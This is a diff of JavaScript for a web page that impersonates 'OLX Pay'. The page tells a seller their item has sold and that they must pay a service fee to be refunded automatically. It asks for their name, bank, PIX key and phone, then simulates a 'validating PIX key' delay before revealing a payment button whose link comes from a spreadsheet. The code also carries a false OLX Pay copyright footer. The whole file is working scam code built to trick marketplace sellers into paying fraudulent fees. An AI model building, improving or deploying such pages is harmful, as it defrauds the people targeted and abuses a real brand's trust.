@@ -1,22 +1,64 @@
 // ========================================================
-// ⚙️ CONFIGURAÇÃO: ATUALIZE COM A URL DO DEPLOY
+// ⚙️ CONFIGURAÇÃO
 const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
 // ========================================================
 
 const mainContainer = document.getElementById('main-container');
 
-// Inicialização
+// --- Função Auxiliar de Formatação (REVISADA) ---
+const formatValueForClient = (value) => {
+    if (!value) return ''; 
+    let valueStr = String(value).trim();
+
+    // 1. Limpa o prefixo 'R$' para processamento
+    valueStr = valueStr.replace(/R\$\s*/g, '');
+    
+    // 2. Se for texto (como 'Grátis' ou '12 horas'), retorna o texto
+    if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) {
+        return valueStr;
+    }
+
+    // 3. Tenta formatar como número (garante formato 1.000,00)
+    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
+    let number = parseFloat(numericStr);
+    
+    if (!isNaN(number)) {
+        return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+    }
+    
+    return valueStr;
+}
+
+// --- NOVO HELPER para decidir o prefixo e o default ---
+const getDisplayValue = (data, isCurrencyField, defaultText) => {
+    const formatted = formatValueForClient(data);
+    
+    if (formatted === '') {
+        return isCurrencyField ? `R$ ${defaultText}` : defaultText;
+    }
+    
+    // Se for campo de moeda, mas for um texto como 'Grátis' ou 'Inclusa', retorna o texto puro.
+    if (isCurrencyField && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) {
+        return formatted;
+    }
+    
+    // Senão, prefixa com R$ se for campo de moeda, ou retorna o valor formatado
+    return isCurrencyField ? `R$ ${formatted}` : formatted;
+}
+
+
+// --- Inicialização Automática ---
 (async function init() {
   const params = new URLSearchParams(window.location.search);
   const id = params.get('id');
 
   if (!id) {
-    return renderError('Link incompleto.');
+    renderError('Link incompleto. Verifique se você copiou o link inteiro enviado pelo vendedor.');
+    return;
   }
 
   try {
-    // O Backend original exige ?action=get&id=...
-    const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
+    const response = await fetch(`${WEB_APP_URL}?id=${id}`);
     const json = await response.json();
 
     if (json.status === 'success') {
@@ -26,66 +68,171 @@ const mainContainer = document.getElementById('main-container');
     }
   } catch (err) {
     console.error(err);
-    renderError('Erro de conexão.');
+    renderError('Erro de conexão. Verifique sua internet e recarregue a página.');
   }
 })();
 
+// --- Função de Renderização Principal ---
 function renderContainer(dadosBrutos) {
-  // Normaliza chaves
+  // Inicialização e normalização para minúsculas
   const dados = {};
-  Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
+  Object.keys(dadosBrutos).forEach(key => {
+    // A chave do objeto será o header em minúsculo (Ex: 'valor total')
+    dados[key.toLowerCase()] = dadosBrutos[key];
+  });
 
-  // Aliases para garantir que funcione com nomes variados na planilha
-  const valor = dados.valor || dados['valor total'] || '';
-  const linkCheckout = dados.linkpagamento || dados.link || '#';
+  // --- CRIAÇÃO DE ALIASES (Mapeamento Robusto) ---
+  // Isso garante que o campo seja preenchido, mesmo se o cabeçalho for "Valor Total"
+  dados.valor = dados.valor || dados['valor total'] || dados['valor do produto'] || '';
+  dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
+  dados.frete = dados.frete || dados['custo frete'] || '';
+  dados.tarifa = dados.tarifa || dados['tarifa olx pay'] || '';
+  dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
+  // Fim dos Aliases
 
   mainContainer.innerHTML = '';
+
+  // Cria Estrutura Base
+  const container = criarElemento('div', { class: 'container' });
+  const imgHeader = criarElemento('div', { class: 'header-image' });
+  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
+  const content = criarElemento('div', { class: 'content' });
+
+  // Variáveis de exibição
+  const prazo = dados.prazo || '15 minutos';
   
-  // Renderiza HTML (Simplificado conforme seu original)
-  const content = document.createElement('div');
-  content.className = 'container';
+  // Link dinâmico vindo da planilha
+  const linkFinal = dados.linkpagamento;
+
   content.innerHTML = `
-    <div class="header-title">Compra Segura</div>
-    <div class="content">
-      <p>Valor: <strong>${valor}</strong></p>
-      <p>Comprador: ${dados.comprador || '---'}</p>
-      
-      <div id="loader-area" style="display:none; text-align:center; margin-top:20px;">
-         <p>Processando...</p>
-      </div>
+    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
+    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    
+    <h2>Detalhes da transação</h2>
+    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
+    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
+    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${getDisplayValue(dados.frete, true, 'Grátis')}</span></p>
+    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${getDisplayValue(dados.tarifa, true, 'Inclusa')}</span></p>
+    ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
+    ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}
 
-      <form id="form-fake">
-        <input type="text" placeholder="Nome" required>
-        <button type="submit">Continuar</button>
-      </form>
-
-      <a id="btn-final" href="${linkCheckout}" class="hidden" style="display:none; background:green; color:white; padding:10px; display:block; text-align:center; margin-top:10px; text-decoration:none;">
-        Liberar Pagamento
-      </a>
+    <div style="margin-top:15px">
+      ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
+      ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
+      ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
     </div>
+
+    <h2>💬 Próximos passos</h2>
+    <ul>
+      <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
+      <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
+    </ul>
   `;
+
+  // --- 1. CRIAÇÃO DO FORMULÁRIO ---
+  const form = criarElemento('form', { id: 'dadosCliente' });
+  const campos = ['nome', 'banco', 'pix', 'telefone'];
   
-  mainContainer.appendChild(content);
+  campos.forEach(campo => {
+    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
+    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
+    form.append(label, input);
+  });
 
-  // Lógica simples de simulação (Fake Loading)
-  const form = content.querySelector('#form-fake');
-  const loader = content.querySelector('#loader-area');
-  const btnFinal = content.querySelector('#btn-final');
+  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados para Recebimento');
+  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
+  form.append(btnEnviar, msgEnvio);
+  content.appendChild(form);
 
+  // --- 2. CRIAÇÃO DO LOADER INTERMEDIÁRIO ---
+  const loaderDiv = document.createElement('div');
+  loaderDiv.id = 'loader-intermedio'; 
+  loaderDiv.innerHTML = `
+    <i class="fa-solid fa-circle-notch fa-spin"></i>
+    <p>Gerando link de pagamento seguro...</p>
+  `;
+  content.appendChild(loaderDiv);
+
+  // --- 3. CRIAÇÃO DO BOTÃO DE PAGAMENTO (Oculto) ---
+  const btnPagamento = criarElemento('a', { 
+    id: 'btn-pagamento', 
+    class: 'button hidden', 
+    href: linkFinal 
+  }, 'Seguir para a liberação');
+  
+  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
+  content.appendChild(btnContainer);
+
+  // Montagem final do HTML
+  container.append(imgHeader, title, content);
+  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
+  container.appendChild(footer);
+  mainContainer.appendChild(container);
+
+  // --- 4. LÓGICA DE ENVIO E ANIMAÇÃO ---
   form.addEventListener('submit', (e) => {
     e.preventDefault();
-    form.style.display = 'none';
-    loader.style.display = 'block';
     
-    // Simula 2 segundos e mostra o botão com o link da planilha
+    // Feedback imediato no botão de envio
+    btnEnviar.innerHTML = `<div class="btn-loading-content"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando chave PIX...</div>`;
+    btnEnviar.disabled = true;
+    btnEnviar.style.background = "#555";
+
+    // Simula tempo de processamento (1.5s)
     setTimeout(() => {
-        loader.style.display = 'none';
-        btnFinal.style.display = 'block';
-        btnFinal.classList.remove('hidden');
-    }, 2000);
+      // A. Feedback de Sucesso
+      msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
+      msgEnvio.style.color = "#00bfa5";
+      msgEnvio.style.fontWeight = "bold";
+
+      // B. Troca de Cena: Sai Form -> Entra Loader Intermediário
+      form.style.display = 'none';
+      loaderDiv.style.display = 'block'; // Mostra o loader temporário
+
+      // C. Inicia a entrada do Botão Verde
+      btnPagamento.classList.remove('hidden');
+      btnPagamento.classList.add('visible');
+      btnPagamento.style.display = 'inline-block';
+
+      // D. LÓGICA INTELIGENTE:
+      // Espera a animação CSS do botão terminar para esconder o loader
+      function finalizarAnimacao(event) {
+        // Verifica se a transição que acabou foi a de opacidade ou transform
+        if (event.propertyName === 'opacity' || event.propertyName === 'transform') {
+           loaderDiv.style.display = 'none'; // Remove o loader intermediário
+           btnPagamento.removeEventListener('transitionend', finalizarAnimacao); // Limpa memória
+        }
+      }
+
+      // Adiciona o "ouvidor" de evento ao botão
+      btnPagamento.addEventListener('transitionend', finalizarAnimacao);
+
+      // Garante scroll suave para o usuário ver a ação
+      btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    }, 1500); // Reduzido para 1.5s (era 3s) para melhor UX
   });
 }
 
+// --- Funções Auxiliares ---
+
 function renderError(msg) {
-  mainContainer.innerHTML = `<div style="padding:20px; text-align:center; color:red;">${msg}</div>`;
+  mainContainer.innerHTML = `
+    <div class="container" style="text-align:center; padding:40px;">
+      <h2 style="color:#ff4d4d;">Atenção</h2>
+      <p style="color:#ccc;">${msg}</p>
+    </div>`;
 }
+
+function criarElemento(tag, attrs = {}, inner = '') {
+  const el = document.createElement(tag);
+  Object.entries(attrs).forEach(([key, value]) => {
+    if (key === 'class') el.className = value;
+    else if (key === 'id') el.id = value;
+    else if (key === 'href') el.href = value;
+    else el.setAttribute(key, value);
+  });
+  if (typeof inner === 'string') el.innerHTML = inner;
+  else if (inner instanceof Node) el.appendChild(inner);
+  return el;
+  }
